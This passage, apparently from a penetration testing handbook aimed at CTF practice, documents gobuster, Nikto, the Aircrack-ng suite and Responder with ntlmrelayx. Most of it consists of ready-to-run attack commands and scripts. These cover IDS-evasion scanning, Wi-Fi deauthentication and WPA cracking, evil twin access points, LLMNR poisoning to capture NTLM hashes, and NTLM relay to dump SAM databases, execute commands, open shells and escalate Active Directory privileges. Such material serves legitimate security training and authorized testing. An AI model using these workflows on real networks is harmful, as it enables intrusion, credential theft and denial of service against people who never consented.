+gobuster dns -d target.com -w wordlist.txt -r 8.8.8.8
+
+# Multiple resolvers
+gobuster dns -d target.com -w wordlist.txt -r 8.8.8.8,1.1.1.1
+```
+
+**Advanced DNS options:**
+
+```bash
+# Timeout per query
+gobuster dns -d target.com -w wordlist.txt --timeout 3s
+
+# Wildcard filtering
+gobuster dns -d target.com -w wordlist.txt --wildcard
+
+# Output results
+gobuster dns -d target.com -w wordlist.txt -o subdomains.txt
+
+# Thread count
+gobuster dns -d target.com -w wordlist.txt -t 50
+```
+
+### Virtual Host Enumeration (vhost mode)
+
+**Discover virtual hosts:**
+
+```bash
+# Basic vhost enumeration
+gobuster vhost -u http://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+
+# Append domain to wordlist entries
+gobuster vhost -u http://target.com -w wordlist.txt --append-domain
+
+# Custom headers
+gobuster vhost -u http://target.com -w wordlist.txt -H "X-Forwarded-For: 127.0.0.1"
+```
+
+**Filter by response characteristics:**
+
+```bash
+# Exclude specific status codes
+gobuster vhost -u http://target.com -w wordlist.txt -b "404"
+
+# Filter by response length
+gobuster vhost -u http://target.com -w wordlist.txt --exclude-length 1234
+```
+
+### S3 Bucket Enumeration (s3 mode)
+
+**Amazon S3 bucket discovery:**
+
+```bash
+# Basic S3 enumeration
+gobuster s3 -w wordlist.txt
+
+# Custom endpoint
+gobuster s3 -w wordlist.txt -e
+
+# Proxy through Burp
+gobuster s3 -w wordlist.txt -p http://127.0.0.1:8080
+```
+
+### Practical CTF Scenarios
+
+**Comprehensive web enumeration:**
+
+```bash
+#!/bin/bash
+TARGET="http://target.com"
+WORDLIST="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
+
+# Initial scan with common extensions
+gobuster dir -u $TARGET -w $WORDLIST -x php,html,txt,bak -o initial_scan.txt
+
+# Extract discovered directories
+grep -oP '(?<=\/)[^\/\s]+(?=\s+\(Status: 200)' initial_scan.txt > discovered_dirs.txt
+
+# Scan discovered directories
+while read dir; do
+    gobuster dir -u "$TARGET/$dir" -w /usr/share/wordlists/dirb/common.txt -x php,txt -o "${dir}_scan.txt"
+done < discovered_dirs.txt
+```
+
+**API endpoint discovery:**
+
+```bash
+# Common API paths
+gobuster dir -u http://target.com/api -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -x json
+
+# RESTful API enumeration
+gobuster dir -u http://target.com/api/v1 -w /usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
+```
+
+**Backup file hunting:**
+
+```bash
+# Common backup extensions
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x bak,old,backup,BAK,~,zip,tar.gz,sql
+
+# Configuration files
+gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/web-all-content-types.txt -x conf,config,cfg,ini,yaml,yml
+```
+
+### Dirbuster (GUI Alternative)
+
+**Installation and launch:**
+
+```bash
+# Pre-installed on Kali
+dirbuster
+
+# Or command line
+java -jar /usr/share/dirbuster/DirBuster-1.0-RC1.jar
+```
+
+**Dirbuster advantages [Inference - based on tool characteristics]:**
+
+- GUI interface for visual analysis
+- Real-time progress monitoring
+- Built-in wordlist management
+- Response analysis with regex filtering
+- Session saving and restoration
+
+**Dirbuster configuration:**
+
+1. Target URL: `http://target.com`
+2. Number of threads: 10-50
+3. Wordlist: Select from list or browse
+4. File extensions: `php,html,txt,bak`
+5. Select HTTP method: GET/HEAD/POST
+6. Start scan
+
+## Nikto
+
+Nikto is a comprehensive web server scanner that performs extensive tests for dangerous files, outdated software, server misconfigurations, and known vulnerabilities.
+
+### Basic Nikto Usage
+
+**Simple scan:**
+
+```bash
+nikto -h http://target.com
+
+# Scan HTTPS
+nikto -h https://target.com
+
+# Scan specific port
+nikto -h http://target.com:8080
+
+# Multiple hosts from file
+nikto -h targets.txt
+```
+
+**Scan options:**
+
+```bash
+# Display only specific finding types
+nikto -h http://target.com -Display 1
+
+# Display codes:
+# 1 - Show redirects
+# 2 - Show cookies received
+# 3 - Show all 200/OK responses
+# 4 - Show URLs requiring authentication
+# V - Verbose output
+# E - Show all HTTP errors
+# P - Show redirects and received cookies
+
+# Combine display options
+nikto -h http://target.com -Display 1234VP
+```
+
+### Tuning and Plugin Selection
+
+**Tune scan tests:**
+
+```bash
+# Scan only specific test categories
+nikto -h http://target.com -Tuning 123
+
+# Tuning options:
+# 0 - File Upload
+# 1 - Interesting File / Seen in logs
+# 2 - Misconfiguration / Default File
+# 3 - Information Disclosure
+# 4 - Injection (XSS/Script/HTML)
+# 5 - Remote File Retrieval - Inside Web Root
+# 6 - Denial of Service
+# 7 - Remote File Retrieval - Server Wide
+# 8 - Command Execution / Remote Shell
+# 9 - SQL Injection
+# a - Authentication Bypass
+# b - Software Identification
+# c - Remote Source Inclusion
+# x - Reverse Tuning (exclude tests)
+
+# Example: Only test for SQLi and XSS
+nikto -h http://target.com -Tuning 49
+
+# Exclude specific tests (reverse tuning)
+nikto -h http://target.com -Tuning x6
+```
+
+**Plugin management:**
+
+```bash
+# List available plugins
+nikto -list-plugins
+
+# Run specific plugins only
+nikto -h http://target.com -Plugins "apache_expect_xss,cookies"
+
+# Common useful plugins:
+nikto -h http://target.com -Plugins "shellshock,heartbleed,httpoptions"
+```
+
+### Output Options
+
+**Save scan results:**
+
+```bash
+# Output to text file
+nikto -h http://target.com -o results.txt
+
+# HTML output
+nikto -h http://target.com -o results.html -Format html
+
+# XML output
+nikto -h http://target.com -o results.xml -Format xml
+
+# CSV output
+nikto -h http://target.com -o results.csv -Format csv
+
+# Multiple formats simultaneously
+nikto -h http://target.com -o results -Format htm,txt,csv
+```
+
+### Authentication and Headers
+
+**Basic authentication:**
+
+```bash
+nikto -h http://target.com -id username:password
+```
+
+**Custom headers:**
+
+```bash
+# Add custom header
+nikto -h http://target.com -useragent "CustomUA/1.0"
+
+# Multiple headers (using config file or -H option not directly supported)
+# Alternative: Use -Option directive
+nikto -h http://target.com -Option USERAGENT="Mozilla/5.0"
+```
+
+**Cookie authentication:**
+
+```bash
+# Not directly supported via CLI
+# Workaround: Modify nikto.conf or use proxy
+nikto -h http://target.com -config /path/to/custom_nikto.conf
+```
+
+### Proxy and Network Options
+
+**Proxy configuration:**
+
+```bash
+# Use HTTP proxy
+nikto -h http://target.com -useproxy http://127.0.0.1:8080
+
+# Proxy with authentication
+nikto -h http://target.com -useproxy http://user:pass@proxy.com:8080
+```
+
+**SSL/TLS options:**
+
+```bash
+# Force SSL
+nikto -h target.com -ssl
+
+# Skip SSL certificate verification (for self-signed certs)
+nikto -h https://target.com -nossl
+
+# Note: -nossl is deprecated; nikto typically accepts self-signed certs by default
+```
+
+**Timeout and throttling:**
+
+```bash
+# Set timeout (seconds)
+nikto -h http://target.com -timeout 10
+
+# Evasion/throttling (IDS evasion)
+nikto -h http://target.com -evasion 1
+
+# Evasion techniques:
+# 1 - Random URI encoding (non-UTF8)
+# 2 - Directory self-reference (/./)
+# 3 - Premature URL ending
+# 4 - Prepend long random string
+# 5 - Fake parameter
+# 6 - TAB as request spacer
+# 7 - Change the case of the URL
+# 8 - Use Windows directory separator (\)
+
+# Combine multiple evasion techniques
+nikto -h http://target.com -evasion 1257
+
+# Pause between tests (seconds)
+nikto -h http://target.com -Pause 2
+```
+
+### Advanced Scanning Techniques
+
+**Port scanning:**
+
+```bash
+# Scan multiple ports on single host
+nikto -h http://target.com -port 80,443,8080,8443
+
+# Scan port range
+nikto -h http://target.com -port 80-90
+```
+
+**Virtual host scanning:**
+
+```bash
+# Specify virtual host
+nikto -h http://192.168.1.100 -vhost target.com
+```
+
+**Save/resume sessions:**
+
+```bash
+# Save session to resume later (not natively supported)
+# Workaround: Use output files and manual review
+
+# Alternative: Use -Cgidirs for incremental testing
+nikto -h http://target.com -Cgidirs all
+```
+
+### Nikto Database Updates
+
+**Update vulnerability database:**
+
+```bash
+# Update plugins and databases
+nikto -update
+
+# Check current version
+nikto -Version
+```
+
+### Practical CTF Scenarios
+
+**Comprehensive vulnerability scan:**
+
+```bash
+#!/bin/bash
+TARGET="http://target.com"
+OUTPUT_DIR="nikto_results"
+
+mkdir -p $OUTPUT_DIR
+
+# Full scan with all tests
+nikto -h $TARGET -o "$OUTPUT_DIR/full_scan.html" -Format html
+
+# Quick scan for common issues
+nikto -h $TARGET -Tuning 123 -o "$OUTPUT_DIR/quick_scan.txt"
+
+# Focused security testing
+nikto -h $TARGET -Tuning 489ab -o "$OUTPUT_DIR/security_scan.txt"
+
+# Check for known vulns (shellshock, heartbleed)
+nikto -h $TARGET -Plugins "shellshock,heartbleed" -o "$OUTPUT_DIR/known_vulns.txt"
+```
+
+**Multi-target scan:**
+
+```bash
+# Create target list
+echo "http://target1.com" > targets.txt
+echo "http://target2.com:8080" >> targets.txt
+echo "https://target3.com" >> targets.txt
+
+# Scan all targets
+while read target; do
+    hostname=$(echo $target | cut -d'/' -f3 | tr ':' '_')
+    nikto -h $target -o "nikto_${hostname}.txt"
+done < targets.txt
+```
+
+**Stealth scanning with evasion:**
+
+```bash
+# Slow, evaded scan
+nikto -h http://target.com \
+    -evasion 1257 \
+    -Pause 3 \
+    -timeout 15 \
+    -useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+```
+
+### Nikto Configuration File
+
+**Location:** `/etc/nikto/config.txt`
+
+**Common modifications:**
+
+```bash
+# Edit config
+sudo nano /etc/nikto/config.txt
+
+# Useful settings:
+# CLIOPTS=-Display 123
+# USERAGENT=Mozilla/5.0...
+# CHECKMETHODS=HEAD GET
+```
+
+### Limitations and Considerations
+
+**Nikto characteristics [Inference - based on common tool behavior]:**
+
+- Noisy scanner (generates significant traffic)
+- Easily detected by IDS/IPS
+- Produces many false positives
+- Best used during authorized testing
+- Complements other scanning tools
+
+## Aircrack-ng Suite
+
+Aircrack-ng is a comprehensive suite of tools for wireless network security assessment, including packet capture, WEP/WPA/WPA2-PSK cracking, and various wireless attacks.
+
+### Suite Components
+
+**Core tools:**
+
+- `airmon-ng` - Enable monitor mode on wireless interfaces
+- `airodump-ng` - Packet capture and network discovery
+- `aireplay-ng` - Packet injection and deauthentication
+- `aircrack-ng` - WEP/WPA-PSK key cracking
+- `airdecap-ng` - Decrypt captured packets
+- `airolib-ng` - Precomputed PMK storage
+- `packetforge-ng` - Create encrypted packets for injection
+- `airbase-ng` - Rogue AP creation
+- `airdeclop-ng` - Remove WEP encryption from capture files
+- `easside-ng` - Automated WEP cracking
+- `wesside-ng` - Automated WEP cracking with PTW attack
+
+### Monitor Mode Configuration
+
+**Enable monitor mode:**
+
+```bash
+# Identify wireless interface
+iwconfig
+# or
+airmon-ng
+
+# Kill interfering processes
+sudo airmon-ng check kill
+
+# Enable monitor mode
+sudo airmon-ng start wlan0
+
+# New interface created: wlan0mon (or mon0 on older systems)
+
+# Verify monitor mode
+iwconfig wlan0mon
+```
+
+**Change wireless channel:**
+
+```bash
+# Set specific channel
+sudo iwconfig wlan0mon channel 6
+
+# Monitor multiple channels (channel hopping)
+# airodump-ng handles this automatically without --channel flag
+```
+
+**Disable monitor mode:**
+
+```bash
+sudo airmon-ng stop wlan0mon
+
+# Restart NetworkManager if killed
+sudo systemctl start NetworkManager
+```
+
+### Network Discovery (airodump-ng)
+
+**Basic wireless network scan:**
+
+```bash
+# Scan all channels
+sudo airodump-ng wlan0mon
+
+# Output columns:
+# BSSID - MAC address of AP
+# PWR - Signal strength
+# Beacons - Number of beacon frames
+# #Data - Number of data packets
+# #/s - Packets per second
+# CH - Channel
+# MB - Maximum speed
+# ENC - Encryption (OPN, WEP, WPA, WPA2, WPA3)
+# CIPHER - Cipher used
+# AUTH - Authentication protocol
+# ESSID - Network name
+```
+
+**Targeted capture:**
+
+```bash
+# Capture on specific channel
+sudo airodump-ng -c 6 wlan0mon
+
+# Target specific BSSID and save to file
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+
+# Output files created:
+# capture-01.cap - Packet capture
+# capture-01.csv - CSV data
+# capture-01.kismet.csv - Kismet compatible
+# capture-01.kismet.netxml - Kismet XML
+```
+
+**Advanced filtering:**
+
+```bash
+# Filter by ESSID
+sudo airodump-ng --essid "TargetNetwork" wlan0mon
+
+# Show only WPA2 networks
+sudo airodump-ng --encrypt WPA2 wlan0mon
+
+# Show only clients (station mode)
+sudo airodump-ng --showack wlan0mon
+
+# Increase capture speed
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF --write-interval 1 -w capture wlan0mon
+```
+
+### WPA/WPA2 Handshake Capture
+
+**Capture 4-way handshake:**
+
+```bash
+# Start capture on target network
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture wlan0mon
+
+# In another terminal, deauthenticate client to force handshake
+sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# Wait for "WPA handshake: AA:BB:CC:DD:EE:FF" message in airodump-ng
+
+# Deauth specific client
+sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
+```
+
+**Verify handshake capture:**
+
+```bash
+# Check for handshake in capture file
+sudo aircrack-ng wpa_capture-01.cap
+
+# Should show "1 handshake" in output
+```
+
+### Deauthentication Attacks (aireplay-ng)
+
+**Basic deauth attack:**
+
+```bash
+# Deauth all clients from AP
+sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# Deauth count (0 = unlimited)
+# -a = AP MAC address
+
+# Deauth specific client
+sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
+
+# -c = Client MAC address
+```
+
+**Targeted deauthentication:**
+
+```bash
+# Continuous deauth (DOS)
+sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
+
+# Burst deauth (stealthy)
+sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
+```
+
+### WPA/WPA2-PSK Cracking (aircrack-ng)
+
+**Dictionary attack:**
+
+```bash
+# Basic dictionary attack
+sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF wpa_capture-01.cap
+
+# -w = Wordlist path
+# -b = Target BSSID (optional, speeds up cracking)
+
+# Use multiple capture files
+sudo aircrack-ng -w wordlist.txt wpa_capture*.cap
+
+# Specify ESSID instead of BSSID
+sudo aircrack-ng -w wordlist.txt -e "TargetNetwork" wpa_capture-01.cap
+```
+
+**Advanced cracking options:**
+
+```bash
+# Use multiple CPU cores (automatic)
+sudo aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture.cap
+
+# Use specific number of CPUs
+sudo aircrack-ng -w wordlist.txt -p 4 capture.cap
+
+# Show cracking statistics
+sudo aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF -S capture.cap
+```
+
+**Custom wordlist generation:**
+
+```bash
+# Using crunch for wordlist generation
+crunch 8 12 -t @@@@%%%% -o custom_wordlist.txt
+# 8-12 chars, @ = lowercase, % = numbers
+
+# Using John the Ripper rules
+john --wordlist=/usr/share/wordlists/rockyou.txt --rules --stdout > custom_wordlist.txt
+```
+
+### WEP Cracking
+
+**WEP attack methodology:**
+
+```bash
+# 1. Start capture
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon
+
+# 2. Fake authentication (if needed)
+sudo aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF -h YOUR_MAC wlan0mon
+
+# 3. ARP replay attack to generate IVs
+sudo aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h YOUR_MAC wlan0mon
+
+# 4. Wait for ~40,000-80,000 data packets (IVs)
+
+# 5. Crack WEP key
+sudo aircrack-ng wep_capture-01.cap
+```
+
+**PTW attack (faster WEP cracking):**
+
+```bash
+# Requires fewer IVs (~20,000)
+sudo aircrack-ng -z wep_capture-01.cap
+```
+
+### PMK Precomputation (airolib-ng)
+
+**Create and populate PMK database:**
+
+```bash
+# Create database
+airolib-ng pmk_database --create
+
+# Import ESSID
+echo "TargetNetwork" > essid.txt
+airolib-ng pmk_database --import essid essid.txt
+
+# Import passwords
+airolib-ng pmk_database --import passwd /usr/share/wordlists/rockyou.txt
+
+# Compute PMKs
+airolib-ng pmk_database --batch
+
+# Verify database
+airolib-ng pmk_database --stats
+```
+
+**Use PMK database for cracking:**
+
+```bash
+sudo aircrack-ng -r pmk_database capture.cap
+```
+
+### Rogue Access Point (airbase-ng)
+
+**Create fake AP:**
+
+```bash
+# Basic rogue AP
+sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon
+
+# WPA2-PSK protected AP
+sudo airbase-ng -e "SecureAP" -c 6 -Z 4 wlan0mon
+# -Z 4 = WPA2 CCMP
+
+# Capture handshakes from connecting clients
+sudo airbase-ng -e "FakeAP" -c 6 -W 1 wlan0mon
+# -W 1 = WEP
+```
+
+**Evil twin attack:**
+
+```bash
+# Clone target AP
+sudo airbase-ng -a AA:BB:CC:DD:EE:FF -e "TargetNetwork" -c 6 wlan0mon
+
+# Deauth clients from real AP in separate terminal
+sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
+```
+
+### Packet Injection Testing
+
+**Test injection capability:**
+
+```bash
+# Test injection
+sudo aireplay-ng --test wlan0mon
+
+# Test against specific AP
+sudo aireplay-ng --test -a AA:BB:CC:DD:EE:FF wlan0mon
+```
+
+### Decrypting Captured Traffic
+
+**Decrypt WEP traffic:**
+
+```bash
+# After obtaining WEP key
+sudo airdecap-ng -w 1234567890 wep_capture-01.cap
+
+# Output: wep_capture-01-dec.cap
+```
+
+**Decrypt WPA traffic:**
+
+```bash
+# After obtaining WPA passphrase
+sudo airdecap-ng -e "TargetNetwork" -p "passphrase123" wpa_capture-01.cap
+
+# Output: wpa_capture-01-dec.cap
+```
+
+### Practical CTF Wireless Scenarios
+
+**Complete WPA2 attack workflow:**
+
+```bash
+#!/bin/bash
+
+INTERFACE="wlan0"
+BSSID="AA:BB:CC:DD:EE:FF"
+CHANNEL="6"
+ESSID="TargetNetwork"
+
+# Enable monitor mode
+sudo airmon-ng check kill
+sudo airmon-ng start $INTERFACE
+
+# Start capture
+sudo airodump-ng -c $CHANNEL --bssid $BSSID -w handshake ${INTERFACE}mon &
+AIRODUMP_PID=$!
+
+# Wait for capture to initialize
+sleep 5
+
+# Deauthenticate clients
+sudo aireplay-ng --deauth 10 -a $BSSID ${INTERFACE}mon
+
+# Wait for handshake
+echo "Waiting for handshake capture..."
+sleep 30
+
+# Kill airodump
+sudo kill $AIRODUMP_PID
+
+# Verify handshake
+if sudo aircrack-ng handshake-01.cap | grep -q "1 handshake"; then
+    echo "[+] Handshake captured successfully"
+    
+    # Crack with rockyou
+    sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b $BSSID handshake-01.cap
+else
+    echo "[-] No handshake captured, retry"
+fi
+
+# Disable monitor mode
+sudo airmon-ng stop ${INTERFACE}mon
+```
+
+**Automated WEP cracking:**
+
+```bash
+# Using wesside-ng (fully automated)
+sudo wesside-ng -i wlan0mon
+
+# Or using easside-ng with server
+sudo easside-ng -v wlan0mon
+```
+
+### Hashcat Integration
+
+**Convert capture to hashcat format:**
+
+```bash
+# Extract handshake to hashcat format
+sudo aircrack-ng capture.cap -J hashcat_handshake
+
+# Output: hashcat_handshake.hccapx (for hashcat <6.0)
+
+# For hashcat 6.0+, use hcxpcapngtool
+hcxpcapngtool -o hashcat.22000 capture.cap
+
+# Crack with hashcat
+hashcat -m 22000 hashcat.22000 /usr/share/wordlists/rockyou.txt
+
+# WPA/WPA2 mode: 2500 (old format), 22000 (new format)
+```
+
+### Troubleshooting
+
+**Common issues and solutions:**
+
+```bash
+# Monitor mode not working
+sudo airmon-ng check kill
+sudo rfkill unblock all
+
+# Injection not working - check with:
+sudo aireplay-ng --test wlan0mon
+
+# No handshake captured:
+# - Increase deauth count
+# - Try deauthing specific clients
+# - Verify channel is correct
+# - Check signal strength (PWR column)
+
+# Card not supported:
+lsusb  # Check if using external adapter
+iwconfig  # Verify interface exists
+```
+
+## Responder
+
+Responder is a LLMNR, NBT-NS, and MDNS poisoner with built-in rogue authentication servers (HTTP/S, SMB, MSSQL, FTP, LDAP) for capturing credentials on Windows networks.
+
+### Responder Overview
+
+**Protocols poisoned:**
+
+- LLMNR (Link-Local Multicast Name Resolution)
+- NBT-NS (NetBIOS Name Service)
+- MDNS (Multicast DNS)
+
+**Built-in rogue servers:**
+
+- HTTP/HTTPS
+- SMB
+- MSSQL
+- FTP
+- LDAP
+- POP3/IMAP/SMTP
+- DNS
+
+### Basic Responder Usage
+
+**Start Responder:**
+
+```bash
+# Basic execution on specific interface
+sudo responder -I eth0
+
+# Analyze mode (no poisoning, just listen)
+sudo responder -I eth0 -A
+
+# Verbose output
+sudo responder -I eth0 -v
+
+# Force WPAD authentication
+sudo responder -I eth0 -w
+
+# Force basic HTTP authentication
+sudo responder -I eth0 -b
+```
+
+**Interface identification:**
+
+```bash
+# List network interfaces
+ip addr show
+ifconfig
+
+# Common interfaces:
+# eth0 - Ethernet
+# wlan0 - Wireless
+# tun0 - VPN tunnel
+```
+
+### Configuration File
+
+**Location:** `/usr/share/responder/Responder.conf`
+
+**Key configuration options:**
+
+```bash
+# Edit configuration
+sudo nano /usr/share/responder/Responder.conf
+
+# Important settings:
+[Responder Core]
+SQL = On              # MSSQL server
+SMB = On              # SMB server
+HTTP = On             # HTTP server
+HTTPS = On            # HTTPS server
+LDAP = On             # LDAP server
+DNS = On              # DNS server
+RDP = On              # RDP server
+
+[HTTP Server]
+Basic = On            # Force basic auth instead of NTLM
+WPAD = On             # WPAD proxy detection
+
+[HTTPS Server]
+SSLCert = certs/responder.crt
+SSLKey = certs/responder.key
+```
+
+### Attack Scenarios
+
+**LLMNR/NBT-NS Poisoning:**
+
+```bash
+# Standard poisoning attack
+sudo responder -I eth0 -wf
+
+# -w = WPAD rogue proxy
+# -f = Force NTLM/Basic authentication on captured requests
+
+# With fingerprinting
+sudo responder -I eth0 -wfF
+
+# -F = Force LM hashing downgrade (weaker, easier to crack)
+```
+
+**Targeted poisoning:**
+
+```bash
+# Respond only to specific hosts (requires modification)
+# Edit Responder.conf:
+# [Responder Core]
+# RespondTo = 192.168.1.100,192.168.1.101
+
+sudo responder -I eth0
+```
+
+**WPAD exploitation:**
+
+```bash
+# Enable WPAD poisoning
+sudo responder -I eth0 -w
+
+# Serve malicious PAC file
+# Automatically created by Responder at /usr/share/responder/wpad.dat
+```
+
+### Protocol-Specific Options
+
+**Disable specific protocols:**
+
+```bash
+# Disable SMB server
+sudo responder -I eth0 --disable-smb
+
+# Disable HTTP server
+sudo responder -I eth0 --disable-http
+
+# Run only specific services
+sudo responder -I eth0 --disable-smb --disable-http --disable-ldap
+```
+
+**Force authentication types:**
+
+```bash
+# Force LM hashing (weaker)
+sudo responder -I eth0 -F
+
+# Force basic authentication on HTTP
+sudo responder -I eth0 -b
+
+# Force WPAD authentication
+sudo responder -I eth0 -w -F -b
+```
+
+### Captured Credentials
+
+**Log file locations:**
+
+```bash
+# Default log directory
+/usr/share/responder/logs/
+
+# Captured hashes
+ls -la /usr/share/responder/logs/
+# Files:
+# - Responder-Session.log (current session)
+# - HTTP-NTLMv2-192.168.1.100.txt
+# - SMB-NTLMv2-SSP-192.168.1.100.txt
+# - MSSQL-NTLMv2-192.168.1.100.txt
+
+# View captured hashes
+cat /usr/share/responder/logs/*.txt
+```
+
+**Hash format examples:**
+
+```
+# NTLMv2 hash format:
+username::domain:challenge:response:response
+
+# Example:
+Administrator::CORP:1122334455667788:A1B2C3D4E5F6...:0101000000000000...
+```
+
+### Cracking Captured Hashes
+
+**Using Hashcat:**
+
+```bash
+# NTLMv2 cracking
+hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
+
+# NTLMv1 cracking
+hashcat -m 5500 hashes.txt wordlist.txt
+
+# Hash modes:
+# 5500 - NetNTLMv1 / NetNTLMv1+ESS
+# 5600 - NetNTLMv2
+# 1000 - NTLM
+
+# With rules
+hashcat -m 5600 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
+
+# Brute force
+hashcat -m 5600 hashes.txt -a 3 ?u?l?l?l?l?d?d?d?d
+```
+
+**Using John the Ripper:**
+
+```bash
+# Crack NTLMv2 hashes
+john --format=netntlmv2 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+# Show cracked passwords
+john --show --format=netntlmv2 hashes.txt
+
+# With rules
+john --format=netntlmv2 hashes.txt --wordlist=wordlist.txt --rules=best64
+```
+
+### MultiRelay Integration
+
+**SMB relay attacks (deprecated in favor of ntlmrelayx):**
+
+```bash
+# Note: MultiRelay.py included with Responder is deprecated
+# Use Impacket's ntlmrelayx.py instead
+
+# Edit Responder.conf - disable SMB and HTTP
+# SMB = Off
+# HTTP = Off
+
+# Start Responder
+sudo responder -I eth0
+
+# In separate terminal, use ntlmrelayx
+sudo ntlmrelayx.py -tf targets.txt -smb2support
+```
+
+### Relay with ntlmrelayx (Impacket)
+
+**NTLM relay attack workflow:**
+
+```bash
+# 1. Disable SMB and HTTP in Responder.conf
+sudo sed -i 's/SMB = On/SMB = Off/' /usr/share/responder/Responder.conf
+sudo sed -i 's/HTTP = On/HTTP = Off/' /usr/share/responder/Responder.conf
+
+# 2. Start Responder for poisoning
+sudo responder -I eth0 -wv
+
+# 3. In separate terminal, start ntlmrelayx
+# Relay to specific target
+sudo ntlmrelayx.py -t 192.168.1.100 -smb2support
+
+# Relay to multiple targets
+echo "192.168.1.100" > targets.txt
+echo "192.168.1.101" >> targets.txt
+sudo ntlmrelayx.py -tf targets.txt -smb2support
+
+# Execute command on successful relay
+sudo ntlmrelayx.py -t 192.168.1.100 -smb2support -c "whoami"
+
+# Dump SAM database
+sudo ntlmrelayx.py -t 192.168.1.100 -smb2support --sam
+
+# Interactive shell
+sudo ntlmrelayx.py -t 192.168.1.100 -smb2support -i
+# Connect with: nc 127.0.0.1 11000
+```
+
+**LDAP relay for privilege escalation:**
+
+```bash
+# Relay to LDAP (Domain Controller)
+sudo ntlmrelayx.py -t ldap://192.168.1.10 --escalate-user lowprivuser
+
+# Relay to LDAPS
+sudo ntlmrelayx.py -t ldaps://192.168.1.10 --escalate-user lowprivuser
+
+# Dump AD information
+sudo ntlmrelayx.py -t ldap://192.168.1.10 --dump-adcs
+```
+
+### Analysis Mode
+
+**Passive monitoring without poisoning:**
+
+```bash
+# Analyze mode
+sudo responder -I eth0 -A
+
+# Outputs:
+# - Hostnames being queried
+# - Broadcast/multicast requests
+# - LLMNR/NBT-NS queries
+# - MDNS queries
+
+# Useful for:
+# - Understanding network behavior
+# - Identifying targets
+# - Avoiding detection
+```
+
+### Fingerprinting
+
+**OS and browser fingerprinting:**
+
+```bash
+# Enable fingerprinting
+sudo responder -I eth0 -f
+
+# Captured in logs:
+# - User-Agent strings
+# - OS version information
+# - Browser types
+# - Requested resources
+```
+
+### Custom Response Files
+
+**Custom HTML pages:**
+
+```bash
+# Location: /usr/share/responder/servers/
+
+# Edit HTTP response
+sudo nano /usr/share/responder/servers/HTTP.py
+
+# Custom authentication page
+sudo nano /usr/share/responder/files/AccessDenied.html
+```
+
+### Practical Attack Workflows
+
+**Complete credential capture scenario:**
+
+```bash
+#!/bin/bash
+
+INTERFACE="eth0"
+OUTPUT_DIR="responder_output_$(date +%Y%m%d_%H%M%S)"
+
+mkdir -p $OUTPUT_DIR
+
+# Backup existing config
+cp /usr/share/responder/Responder.conf $OUTPUT_DIR/Responder.conf.bak
+
+# Start Responder with optimal settings
+echo "[*] Starting Responder on $INTERFACE"
+sudo responder -I $INTERFACE -wfFbv | tee $OUTPUT_DIR/responder_output.log &
+RESPONDER_PID=$!
+
+echo "[+] Responder started with PID: $RESPONDER_PID"
+echo "[*] Press Ctrl+C to stop and collect hashes"
+
+# Wait for Ctrl+C
+trap ctrl_c INT
+function ctrl_c() {
+    echo "[*] Stopping Responder..."
+    sudo kill $RESPONDER_PID
+    
+    # Copy captured hashes
+    sudo cp /usr/share/responder/logs/*.txt $OUTPUT_DIR/ 2>/dev/null
+    
+    # Combine all hashes
+    cat $OUTPUT_DIR/*NTLMv2*.txt > $OUTPUT_DIR/all_hashes.txt 2>/dev/null
+    
+    echo "[+] Hashes saved to $OUTPUT_DIR/all_hashes.txt"
+    echo "[*] Crack with: hashcat -m 5600 $OUTPUT_DIR/all_hashes.txt wordlist.txt"
+    
+    exit 0
+}
+
+# Keep script running
+while true; do sleep 1; done
+```
+
+**Responder + ntlmrelayx combined attack:**
+
+```bash
+#!/bin/bash
+
+INTERFACE="eth0"
+TARGET="192.168.1.100"
+
+# Disable SMB/HTTP in Responder
+echo "[*] Configuring Responder for relay..."
+sudo sed -i 's/SMB = On/SMB = Off/' /usr/share/responder/Responder.conf
+sudo sed -i 's/HTTP = On/HTTP = Off/' /usr/share/responder/Responder.conf
+
+# Start Responder
+echo "[*] Starting Responder for poisoning..."
+sudo responder -I $INTERFACE -wv &
+RESPONDER_PID=$!
+
+# Wait for Responder to initialize
+sleep 3
+
+# Start ntlmrelayx in separate terminal or tmux
+echo "[*] Starting ntlmrelayx for relay attacks..."
+echo "[!] Run this in separate terminal:"
+echo "sudo ntlmrelayx.py -t $TARGET -smb2support --sam -c 'whoami'"
+
+# Cleanup function
+cleanup() {
+    echo "[*] Cleaning up..."
+    sudo kill $RESPONDER_PID 2>/dev/null
+    
+    # Restore Responder config
+    sudo sed -i 's/SMB = Off/SMB = On/' /usr/share/responder/Responder.conf
